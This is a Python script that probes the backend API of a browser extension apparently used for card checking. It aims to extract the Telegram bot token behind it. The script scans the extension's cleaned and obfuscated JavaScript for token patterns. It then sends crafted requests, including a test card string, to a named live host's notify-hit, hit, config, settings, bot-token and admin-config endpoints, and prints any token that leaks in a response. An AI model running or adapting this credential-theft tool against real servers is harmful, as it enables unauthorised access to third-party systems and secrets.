#!/usr/bin/env python3
"""
Bot token extractor — tries to pull the Telegram bot_token from
the AriesxHit backend API that the extension talks to.

Strategy:
  1. Look for bot_token hardcoded in the clean JS source
  2. Try the extension's own API endpoints that receive / return settings
     The extension sends  { bot_token, chat_id }  to /api/tg/notify-hit
     and fetches settings from /api/tg/hit, /api/extension-status, etc.
     We probe those endpoints with dummy payloads to see if the server
     echoes the token back.
  3. Try /api/settings, /api/config, /api/bot-config (common patterns)
"""

import re
import json
import requests

API = "https://aries.mikeyyfrr.me"
HEADERS = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
TIMEOUT = 10

BOT_TOKEN_RE = re.compile(r'\b(\d{8,12}:[A-Za-z0-9_-]{35,})\b')


def grep_file(path: str):
    print(f"\n[1] Scanning {path} for hardcoded bot tokens...")
    try:
        with open(path, encoding="utf-8") as f:
            src = f.read()
        found = BOT_TOKEN_RE.findall(src)
        if found:
            for t in set(found):
                print(f"    ✅ FOUND IN FILE: {t}")
        else:
            print("    ℹ️  No hardcoded token in JS source.")
    except FileNotFoundError:
        print(f"    ⚠️  File not found: {path}")


def probe(method: str, path: str, payload=None, label=""):
    url = API + path
    try:
        if method == "GET":
            r = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        else:
            r = requests.post(url, headers=HEADERS,
                              json=payload or {}, timeout=TIMEOUT)
        print(f"\n[API] {method} {path}  →  {r.status_code}")
        try:
            data = r.json()
        except Exception:
            data = {"raw": r.text[:500]}

        print(f"    Response: {json.dumps(data, indent=2)[:600]}")

        # scan response for token pattern
        text = json.dumps(data)
        found = BOT_TOKEN_RE.findall(text)
        if found:
            for t in set(found):
                print(f"    🔑 TOKEN LEAKED IN RESPONSE: {t}")
        return data
    except Exception as e:
        print(f"    ❌ {e}")
        return {}


def main():
    # ── 1. grep JS source ────────────────────────────────────────────────────
    grep_file("background_clean.js")
    grep_file("bg_obf.js")

    # ── 2. probe API endpoints the extension uses ────────────────────────────
    print("\n[2] Probing backend API endpoints...")

    # The extension POSTs these when a hit occurs — maybe server echoes token
    probe("POST", "/api/tg/notify-hit", {
        "tg_id": "test", "card": "4242424242424242|12|26|123",
        "amount": "1.00", "bot_token": "", "chat_id": ""
    })

    # checkout-info endpoint
    probe("POST", "/api/tg/checkout-info", {
        "checkout_url": "https://checkout.stripe.com/c/pay/test"
    })

    # hit endpoint — extension sends tg_id + checkout_url
    probe("POST", "/api/tg/hit", {
        "tg_id": "test", "checkout_url": "https://checkout.stripe.com/c/pay/test"
    })

    # extension status — returns maintenance/expired flags (may include config)
    probe("GET", "/api/extension-status")

    # common config / settings endpoints
    for ep in ["/api/config", "/api/settings", "/api/bot-config",
               "/api/bot", "/api/tg/config", "/api/tg/settings",
               "/api/tg/bot-token", "/api/admin/config"]:
        probe("GET", ep)

    # validate-license sometimes returns full config on success
    probe("POST", "/api/validate-license", {"key": "test"})

    print("\n[Done]")


if __name__ == "__main__":
    main()
